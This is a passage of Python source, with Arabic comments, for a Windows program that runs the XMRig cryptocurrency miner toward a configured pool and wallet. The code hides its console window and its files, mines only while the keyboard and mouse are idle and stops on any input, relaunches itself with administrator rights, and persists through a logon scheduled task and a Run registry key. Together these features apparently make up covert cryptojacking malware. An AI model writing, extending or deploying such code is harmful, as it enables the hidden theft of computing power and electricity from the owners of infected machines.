            if getattr(self, "_cuda_disabled_by_failure", False):
                return
            self._cuda_disabled_by_failure = True
        else:
            return

        log.warning(f"Auto-disabling failed GPU backend [{b_low}] -> reason: {reason}")
        try:
            if os.path.isfile(CONFIG_FILE):
                with open(CONFIG_FILE, "r", encoding="utf-8") as cf:
                    cfg_data = json.load(cf)
                if isinstance(cfg_data, dict):
                    sec = cfg_data.get(b_low)
                    if not isinstance(sec, dict):
                        sec = {}
                    sec["enabled"] = False
                    cfg_data[b_low] = sec
                    self._write_config_json_safely(cfg_data)
                    log.info(f"Updated {CONFIG_FILE}: set {b_low}.enabled = False")
        except Exception as exc:
            log.warning(f"Failed updating {CONFIG_FILE} after {b_low} failure: {exc}")

    # إنشاء ملف الإعدادات مع معالجة PermissionError وتفعيل GPU المتاح
    # -----------------------------------------------------------
    def _write_config_json_safely(self, config: dict) -> None:
        if CONFIG.get("hide_artifacts") and os.path.exists(CONFIG_FILE):
            _apply_hidden_attribute(CONFIG_FILE)

        tmp_cfg = f"{CONFIG_FILE}.tmp.{os.getpid()}"
        last_err = None
        for attempt in range(4):
            try:
                with open(tmp_cfg, "w", encoding="utf-8") as f:
                    json.dump(config, f, indent=4)
                os.replace(tmp_cfg, CONFIG_FILE)
                return
            except PermissionError as e:
                last_err = e
                if os.path.exists(tmp_cfg):
                    try:
                        os.remove(tmp_cfg)
                    except OSError:
                        pass
                try:
                    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                        json.dump(config, f, indent=4)
                    return
                except PermissionError as direct_err:
                    last_err = direct_err
                    if attempt < 3:
                        time.sleep(0.25 * (attempt + 1))

        raise PermissionError(
            f"Unable to write {CONFIG_FILE} after retries: {last_err}"
        )

    def create_config(self):
        if self.gpu_type is None:
            self.gpu_type = self.detect_gpu()

        gpu_allowed = bool(CONFIG.get("enable_gpu_mining", True))
        is_nvidia = gpu_allowed and (self.gpu_type == "NVIDIA")
        is_amd = gpu_allowed and (self.gpu_type == "AMD")

        opencl_enabled = (not getattr(self, '_opencl_disabled_by_failure', False)) and is_amd and self._has_opencl_runtime_files()
        if is_nvidia and not self._cuda_plugin_ready():
            self._auto_acquire_cuda_plugin()
        cuda_plugin_ready = self._cuda_plugin_ready()
        cuda_enabled = (not getattr(self, '_cuda_disabled_by_failure', False)) and is_nvidia and cuda_plugin_ready
        gpu_intensity = int(CONFIG.get("gpu_intensity", 85))
        active_xmrig_log = self._resolve_active_xmrig_log_file()

        if is_nvidia and not cuda_plugin_ready:
            log.warning(
                f"NVIDIA GPU detected, but {CUDA_PLUGIN_DLL} is not present/verified; "
                "CUDA will remain disabled while CPU/other available backends continue."
            )

        config = {
            "api": {"id": None, "worker-id": None},
            "http": {
                "enabled": False,
                "host": "127.0.0.1",
                "port": 0,
                "access-token": None,
                "restricted": True,
            },
            "autosave": True,
            "background": False,
            "colors": False,
            "title": False,
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": False,
                "rdmsr": False,
                "wrmsr": False,
                "cache_qos": False,
                "numa": True,
                "scratchpad_prefetch_mode": 1,
            },
            "cpu": {
                "enabled": True,
                "huge-pages": True,
                "huge-pages-jit": False,
                "hw-aes": None,
                "priority": 2,
                "memory-pool": False,
                "yield": True,
                "max-threads-hint": CONFIG["cpu_intensity"],
                "asm": True,
            },
            "opencl": {
                "enabled": opencl_enabled,
                "intensity": gpu_intensity,
            },
            "cuda": {
                "enabled": cuda_enabled,
                "loader": CUDA_PLUGIN_DLL if cuda_plugin_ready else None,
                "nvml": True,
                "intensity": gpu_intensity,
            },
            "log-file": active_xmrig_log,
            "donate-level": 1,
            "donate-over-proxy": 0,
            "pools": [
                {
                    "algo": None,
                    "coin": None,
                    "url": CONFIG["pool"],
                    "user": f"{CONFIG['wallet']}.{CONFIG['worker_name']}",
                    "pass": "x",
                    "rig-id": None,
                    "nicehash": False,
                    "keepalive": True,
                    "enabled": True,
                    "tls": True,
                    "sni": False,
                    "tls-fingerprint": None,
                    "daemon": False,
                    "self-select": None,
                    "submit-to-origin": False,
                }
            ],
            "retries": {"count": 5, "pause": 5},
            "print-time": 60,
            "health-print-time": 60,
            "dmi": True,
            "retry-pause": 5,
            "syslog": False,
            "tls": {"enabled": False},
        }

        self._write_config_json_safely(config)

        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                reloaded = json.load(f)
        except Exception as e:
            raise RuntimeError(f"Config JSON validation failed: {e}")

        if not isinstance(reloaded, dict) or not isinstance(reloaded.get("pools"), list) or not reloaded["pools"]:
            raise RuntimeError("Config JSON structure malformed: missing valid pools list")

        if CONFIG.get("hide_artifacts"):
            self.hide_file(CONFIG_FILE)

        log.info(
            f"Config JSON written and validated (wallet={CONFIG['wallet'][:12]}..., "
            f"adapter={self.gpu_type}, opencl={opencl_enabled}, cuda={cuda_enabled}, "
            f"cuda_dll_ready={cuda_plugin_ready}, cpu_intensity={CONFIG['cpu_intensity']}, "
            f"gpu_intensity={gpu_intensity})"
        )

    # -----------------------------------------------------------
    # تتبع المراحل ومراقبة سجل XMRig مع معالجة PermissionError
    # -----------------------------------------------------------
    def _advance_stage(self, new_stage: str, detail: str = ""):
        order = [
            MiningStage.IDLE,
            MiningStage.PROCESS_STARTED,
            MiningStage.POOL_CONNECTED,
            MiningStage.JOB_RECEIVED,
            MiningStage.SHARE_ACCEPTED,
        ]
        if new_stage not in order:
            log.warning(
                f"Stage cannot be confirmed locally: {new_stage}. "
                "Verify balance through the pool dashboard."
            )
            return
        if self.stage not in order:
            self.stage = MiningStage.IDLE
        current_index = order.index(self.stage)
        new_index = order.index(new_stage)
        if new_index > current_index:
            self.stage = new_stage
            suffix = f" ({detail})" if detail else ""
            log.info(f"Mining stage -> {new_stage}{suffix}")

    def _get_current_config_log_file(self) -> str:
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as cf:
                data = json.load(cf)
            lf = data.get("log-file")
            if isinstance(lf, str) and lf.strip():
                return lf.strip()
        except Exception:
            pass
        return self._resolve_active_xmrig_log_file()

    def _prepare_session_log(self) -> str:
        marker = f"=== SESSION_START_{time.monotonic_ns()} ==="
        target_log = self._get_current_config_log_file()
        self._watched_log_file = target_log
        if CONFIG.get("hide_artifacts") and os.path.exists(target_log):
            _apply_hidden_attribute(target_log)
        try:
            with open(target_log, "w", encoding="utf-8") as f:
                f.write(marker + "\n")
        except PermissionError:
            log.warning(
                f"Log locked for overwrite; appending session marker instead: {target_log}"
            )
            with open(target_log, "a", encoding="utf-8") as f:
                f.write("\n" + marker + "\n")
        return marker

    def _watch_xmrig_log(self, expected_marker: str):
        watched = getattr(self, "_watched_log_file", None) or self._get_current_config_log_file()
        try:
            if not os.path.exists(watched):
                with open(watched, "w", encoding="utf-8"):
                    pass
            in_current_session = False
            with open(watched, "r", encoding="utf-8", errors="ignore") as f:
                while not self._stop_log_watch.is_set():
                    line = f.readline()
                    if not line:
                        time.sleep(0.25)
                        continue
                    stripped = line.strip()
                    if stripped == expected_marker:
                        in_current_session = True
                        continue
                    if not in_current_session:
                        continue
                    low = stripped.lower()
                    if ("cuda" in low or "opencl" in low) and (
                        "ready" in low or "enabled" in low or "device" in low
                    ) and "disabled" not in low:
                        if not self.gpu_backend_active:
                            self.gpu_backend_active = True
                            log.info(f"GPU backend active in XMRig log: {stripped}")
                    if "use pool" in low or "connected" in low:
                        self._advance_stage(MiningStage.POOL_CONNECTED, stripped)
                    if "new job" in low:
                        log.info("New mining job detected")
                        self._advance_stage(MiningStage.JOB_RECEIVED, stripped)
                    if "accepted" in low:
                        self.accepted_shares += 1
                        log.info(f"Accepted share event detected (total={self.accepted_shares})")
                        self._advance_stage(
                            MiningStage.SHARE_ACCEPTED,
                            f"accepted_shares={self.accepted_shares}",
                        )
                    if "rejected" in low:
                        self.rejected_shares += 1
                        log.warning(f"Rejected share event detected (total={self.rejected_shares})")
                    if (
                        "cl_build_program_failure" in low
                        or "cl_invalid_program" in low
                        or "self-test failed" in low
                        or ("opencl" in low and ("disabled" in low or "failed" in low))
                    ):
                        self._disable_failed_gpu_backend("opencl", stripped)
                    if (
                        "cuda" in low
                        and ("failed" in low or "error" in low or "disabled" in low)
                        and ("thread" in low or "self-test" in low or "disabled" in low or "no cuda" in low)
                    ):
                        self._disable_failed_gpu_backend("cuda", stripped)
                    if "speed" in low and ("h/s" in low or "kh/s" in low):
                        m_speed = re.search(
                            r"speed\s+10s/60s/15m\s+([\d.]+|n/a)\s+([\d.]+|n/a)\s+([\d.]+|n/a)\s+([kKmM]?H/s)(?:\s+max\s+([\d.]+)\s+[kKmM]?H/s)?",
                            stripped,
                            flags=re.IGNORECASE,
                        )
                        if m_speed:
                            self.latest_hashrate = (
                                f"10s={m_speed.group(1)} 60s={m_speed.group(2)} 15m={m_speed.group(3)} {m_speed.group(4)}"
                                + (f" (max={m_speed.group(5)} {m_speed.group(4)})" if m_speed.group(5) else "")
                            )
                        else:
                            self.latest_hashrate = stripped
                    now_s = time.monotonic()
                    stats_interval = max(15.0, float(CONFIG.get("log_stats_interval_seconds", 60)))
                    if now_s - getattr(self, "_last_stats_log_at", 0.0) >= stats_interval:
                        self._last_stats_log_at = now_s
                        log.info(
                            f"Stats summary -> stage={self.stage}, accepted={self.accepted_shares}, "
                            f"rejected={self.rejected_shares}, hashrate={getattr(self, 'latest_hashrate', 'n/a')}"
                        )
        except Exception as e:
            log.warning(f"XMRig log watcher stopped with error: {e}")

    def _start_log_watcher(self):
        self._stop_log_watch.clear()
        self._session_marker = self._prepare_session_log()
        self._log_thread = threading.Thread(
            target=self._watch_xmrig_log,
            args=(self._session_marker,),
            daemon=True,
        )
        self._log_thread.start()

    def _stop_log_watcher(self):
        self._stop_log_watch.set()
        if self._log_thread and self._log_thread.is_alive():
            self._log_thread.join(timeout=2)
        self._log_thread = None

    def start_mining(self) -> bool:
        if not _IS_WINDOWS:
            log.error("start_mining: non-Windows host")
            return False
        if self.process is not None and self.process.poll() is None:
            log.warning("start_mining: previous process still running; skipping duplicate start")
            return False
        if not self._miner_ready() or not os.path.isfile(CONFIG_FILE):
            log.warning("Prerequisites missing; running setup...")
            if not self.setup_environment():
                log.error("Setup failed; cannot start miner")
                return False
            if not self._miner_ready() or not os.path.isfile(CONFIG_FILE):
                log.error("Setup reported success but artifacts missing")
                return False
        try:
            self.stage = MiningStage.IDLE
            self.gpu_backend_active = False
            self.accepted_shares = 0
            self.rejected_shares = 0
            self._mining_started_at = None
            self._start_log_watcher()
            self._sync_artifact_visibility()

            hide_win = bool(CONFIG.get("hide_console"))
            si = subprocess.STARTUPINFO()
            if hide_win:
                si.dwFlags |= STARTF_USESHOWWINDOW
                si.wShowWindow = SW_HIDE
            creation_flags = CREATE_NO_WINDOW | DETACHED_PROCESS if hide_win else 0
            proc = subprocess.Popen(
                [MINER_EXE, "--config", CONFIG_FILE, "--no-color"],
                creationflags=creation_flags,
                startupinfo=si,
                cwd=WORK_DIR,
                stdout=subprocess.DEVNULL if hide_win else None,
                stderr=subprocess.DEVNULL if hide_win else None,
            )
            grace = max(0, int(CONFIG.get("startup_grace_seconds", 0)))
            if grace > 0:
                time.sleep(grace)
            rc = proc.poll()
            if rc is not None:
                self._stop_log_watcher()
                self.stage = MiningStage.IDLE
                self._mining_started_at = None
                log.error(f"Miner exited immediately after start (exit_code={rc})")
                return False

            self.process = proc
            self._mining_started_at = time.monotonic()
            self._advance_stage(MiningStage.PROCESS_STARTED, f"PID={self.process.pid}")
            return True
        except Exception as e:
            self._stop_log_watcher()
            self.stage = MiningStage.IDLE
            self._mining_started_at = None
            log.error(f"Miner start failed: {e}")
            return False

    def monitor_mouse_and_mine(self):
        idle_threshold = float(CONFIG.get("mouse_idle_start_seconds", 90))
        poll_interval = max(0.1, float(CONFIG.get("mouse_poll_seconds", 0.5)))

        last_pos = self.get_mouse_position()
        mining_active_since = None
        stability_recorded = False
        read_failure_logged = False
        last_activity_monotonic = time.monotonic()
        next_retry_after = 0.0

        log.info(
            f"Continuous input monitor active (keyboard + mouse): starts after {idle_threshold:.0f}s "
            "of continuous inactivity, resets countdown on any input, and stops immediately upon input."
        )

        try:
            while True:
                now_mono = time.monotonic()
                current_pos = self.get_mouse_position()
                current_idle_sec = self.get_idle_seconds()

                mouse_moved = (
                    current_pos is not None
                    and last_pos is not None
                    and current_pos != last_pos
                )
                if current_pos is not None:
                    last_pos = current_pos

                is_running = self.process is not None and self.process.poll() is None

                if current_idle_sec is None:
                    if not read_failure_logged:
                        log.warning(
                            "Unable to read current input idle time; keeping current state safely."
                        )
                        read_failure_logged = True
                    if mouse_moved:
                        last_activity_monotonic = now_mono
                        if is_running:
                            elapsed_sec = (
                                now_mono - self._mining_started_at
                                if self._mining_started_at is not None
                                else 0.0
                            )
                            log.info(
                                f"Mouse moved to {current_pos} -> stopping miner immediately "
                                f"after {elapsed_sec:.1f}s"
                            )
                            self._safe_terminate()
                            mining_active_since = None
                            stability_recorded = False
                    time.sleep(poll_interval)
                    continue

                read_failure_logged = False
                recent_input = mouse_moved or (current_idle_sec <= poll_interval)

                if recent_input:
                    last_activity_monotonic = now_mono
                    if is_running:
                        elapsed_sec = (
                            now_mono - self._mining_started_at
                            if self._mining_started_at is not None
                            else 0.0
                        )
                        log.info(
                            f"Active input detected (idle={current_idle_sec:.2f}s, pos={current_pos}) "
                            f"-> stopping miner immediately after {elapsed_sec:.1f}s "
                            f"(stage={self.stage}, gpu_active={self.gpu_backend_active}, "
                            f"accepted_shares={self.accepted_shares})"
                        )
                        self._safe_terminate()
                        mining_active_since = None
                        stability_recorded = False
                else:
                    effective_idle_sec = min(
                        current_idle_sec,
                        max(0.0, now_mono - last_activity_monotonic),
                    )

                    if is_running:
                        if mining_active_since is None:
                            mining_active_since = now_mono
                        elif (
                            not stability_recorded
                            and (now_mono - mining_active_since)
                            >= CONFIG["stable_runtime_seconds"]
                        ):
                            log.info(
                                f"Process alive continuously during idle for {CONFIG['stable_runtime_seconds']}s "
                                f"(stage={self.stage}, gpu_active={self.gpu_backend_active}, "
                                f"accepted_shares={self.accepted_shares})"
                            )
                            stability_recorded = True
                    else:
                        mining_active_since = None
                        stability_recorded = False
                        if self.process is not None:
                            self._safe_terminate()
                            self.process = None
                            self.stage = MiningStage.IDLE
                            next_retry_after = now_mono + float(
                                CONFIG.get("restart_backoff_seconds", 5)
                            )
                            log.warning(
                                "Miner process stopped unexpectedly; will re-evaluate after "
                                f"{CONFIG.get('restart_backoff_seconds', 5)}s and {idle_threshold:.0f}s idle."
                            )

                        if (
                            now_mono >= next_retry_after
                            and effective_idle_sec >= idle_threshold
                        ):
                            self.restart_count += 1
                            log.info(
                                f"No keyboard/mouse input for {effective_idle_sec:.1f}s -> "
                                f"starting process (attempt #{self.restart_count})"
                            )
                            if self.start_mining():
                                mining_active_since = time.monotonic()
                            else:
                                next_retry_after = time.monotonic() + float(
                                    CONFIG.get("restart_backoff_seconds", 5)
                                )
                                log.error(
                                    f"Start failed (attempt #{self.restart_count}); "
                                    f"will retry after {CONFIG.get('restart_backoff_seconds', 5)}s if idle continues."
                                )

                time.sleep(poll_interval)
        except KeyboardInterrupt:
            log.info("Interrupted by user")
        except Exception as e:
            log.error(f"Input/mining monitor error: {e}", exc_info=True)
        finally:
            self.stop_mining()

    def _safe_terminate(self) -> bool:
        self._stop_log_watcher()
        if not self.process:
            self.stage = MiningStage.IDLE
            self._mining_started_at = None
            return True
        pid = self.process.pid
        terminated = False
        try:
            if self.process.poll() is None:
                if _IS_WINDOWS:
                    res = subprocess.run(
                        ["taskkill", "/PID", str(pid), "/T", "/F"],
                        capture_output=True,
                        timeout=10,
                        creationflags=CREATE_NO_WINDOW,
                    )
                    if res.returncode != 0:
                        err = (res.stderr or b"").decode("utf-8", errors="replace")[:300]
                        log.warning(f"taskkill rc={res.returncode} pid={pid}: {err}")
                        try:
                            self.process.kill()
                        except Exception as e:
                            log.error(f"Fallback kill failed: {e}")
                else:
                    self.process.terminate()
                try:
                    self.process.wait(timeout=self._terminate_timeout)
                except subprocess.TimeoutExpired:
                    log.warning("Timeout waiting; forcing kill")
                    self.process.kill()
                    try:
                        self.process.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        log.error("Process still alive after kill")

            terminated = self.process.poll() is not None
            return terminated
        except Exception as e:
            log.error(f"Safe terminate failed: {e}")
            return False
        finally:
            if terminated:
                if self._mining_started_at is not None:
                    elapsed_sec = max(0.0, time.monotonic() - self._mining_started_at)
                    log.info(f"Mining session duration before stop: {elapsed_sec:.1f}s")
                    self._mining_started_at = None
                self.process = None
                self.stage = MiningStage.IDLE

    def stop_mining(self):
        if self._safe_terminate():
            log.info("Miner stopped")
        else:
            log.warning("Miner stop incomplete; process reference retained")

    def hide_file(self, path):
        if not _IS_WINDOWS:
            return
        if not _apply_hidden_attribute(path):
            log.warning(f"Hidden not applied or unreadable for {path}")

    def _build_startup_command(self) -> str | None:
        if getattr(sys, "frozen", False):
            exe_path = os.path.abspath(sys.executable)
            if not os.path.isfile(exe_path):
                return None
            return f'"{exe_path}"'

        script_path = os.path.abspath(__file__)
        if not os.path.isfile(script_path):
            log.warning("Script path does not exist; skipping startup entry")
            return None

        python_exe = os.path.abspath(sys.executable)
        if CONFIG.get("hide_console"):
            pythonw = os.path.join(os.path.dirname(python_exe), "pythonw.exe")
            if os.path.isfile(pythonw):
                python_exe = pythonw
        return f'"{python_exe}" "{script_path}"'

    def _register_scheduled_task(self, cmd: str) -> bool:
        if not _IS_WINDOWS:
            return False
        try:
            res = subprocess.run(
                [
                    "schtasks",
                    "/Create",
                    "/TN",
                    STARTUP_TASK_NAME,
                    "/TR",
                    cmd,
                    "/SC",
                    "ONLOGON",
                    "/RL",
                    "HIGHEST",
                    "/F",
                ],
                capture_output=True,
                text=True,
                timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
            if res.returncode == 0:
                log.info(f"Registered scheduled task [{STARTUP_TASK_NAME}] -> {cmd}")
                return True
            log.warning(
                f"schtasks failed (rc={res.returncode}): {(res.stderr or res.stdout or '').strip()}"
            )
            return False
        except Exception as e:
            log.warning(f"Scheduled task registration error: {e}")
            return False

    def add_to_startup(self) -> bool:
        if not _IS_WINDOWS:
            return False
        cmd = self._build_startup_command()
        if not cmd:
            return False

        task_ok = self._register_scheduled_task(cmd)
        reg_ok = False

        if _HAS_WINREG:
            try:
                with winreg.CreateKeyEx(
                    winreg.HKEY_CURRENT_USER,
                    STARTUP_RUN_KEY,
                    0,
                    winreg.KEY_READ | winreg.KEY_WRITE,
                ) as k:
                    winreg.SetValueEx(k, STARTUP_VALUE_NAME, 0, winreg.REG_SZ, cmd)
                    persisted, _ = winreg.QueryValueEx(k, STARTUP_VALUE_NAME)
                if persisted == cmd:
                    reg_ok = True
                    log.info(
                        f"Registered in HKCU\\{STARTUP_RUN_KEY} [{STARTUP_VALUE_NAME}] -> {cmd}"
                    )
                else:
                    log.warning(
                        f"Startup registry mismatch after write (expected={cmd!r}, got={persisted!r})"
                    )
            except Exception as e:
                log.error(f"Registry startup error: {e}")
        else:
            log.warning("Registry startup unavailable on this platform or missing winreg.")

        return task_ok or reg_ok

    def remove_from_startup(self) -> bool:
        if not _IS_WINDOWS:
            return False
        removed_any = False
        try:
            res = subprocess.run(
                ["schtasks", "/Delete", "/TN", STARTUP_TASK_NAME, "/F"],
                capture_output=True,
                text=True,
                timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
            if res.returncode == 0:
                log.info(f"Removed scheduled task [{STARTUP_TASK_NAME}]")
                removed_any = True
        except Exception as e:
            log.warning(f"Scheduled task delete error: {e}")

        if _HAS_WINREG:
            try:
                with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER, STARTUP_RUN_KEY, 0, winreg.KEY_WRITE
                ) as k:
                    winreg.DeleteValue(k, STARTUP_VALUE_NAME)
                log.info(f"Removed [{STARTUP_VALUE_NAME}] from HKCU\\{STARTUP_RUN_KEY}")
                removed_any = True
            except FileNotFoundError:
                removed_any = True
            except Exception as e:
                log.error(f"Registry delete error: {e}")
        return removed_any

    def optimize_system(self):
        if not _IS_WINDOWS:
            return
        try:
            subprocess.run(
                ["powercfg", "-setactive", "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"],
                check=True,
                timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
        except Exception as e:
            log.warning(f"Power plan change failed: {e}")


def _relaunch_as_admin() -> bool:
    if not _IS_WINDOWS:
        return False
    try:
        if getattr(sys, "frozen", False):
            target = sys.executable
            args = sys.argv[1:]
        else:
            target = sys.executable
            if CONFIG.get("hide_console"):
                pythonw = os.path.join(os.path.dirname(target), "pythonw.exe")
                if os.path.isfile(pythonw):
                    target = pythonw
            script_path = os.path.abspath(sys.argv[0])
            args = [script_path] + sys.argv[1:]

        params = subprocess.list2cmdline(args)
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", target, params, None, SW_HIDE if CONFIG.get("hide_console") else 1
        )
        return rc > 32
    except Exception as e:
        log.error(f"Relaunch failed: {e}")
        return False


if __name__ == "__main__":
    _hide_current_window()
    _validate_config_or_die()
    if CONFIG.get("hide_artifacts"):
        _apply_hidden_attribute(WORK_DIR)
        _apply_hidden_attribute(LOG_FILE)

    if not _IS_WINDOWS:
        print(f"FATAL: Windows-only build on {platform.system()}.", file=sys.stderr)
        sys.exit(2)

    if not ctypes.windll.shell32.IsUserAnAdmin():
        if not _relaunch_as_admin():
            log.error(
                "FATAL: Elevation failed (UAC declined or ShellExecuteW error). "
                "Run from an elevated prompt."
            )
            sys.exit(3)
        sys.exit(0)

    miner = GPUMiner()
    miner.gpu_type = miner.detect_gpu()
    if miner.setup_environment():
        miner.monitor_mouse_and_mine()
    else:
        log.error("Setup failed - aborting")
        sys.exit(1)
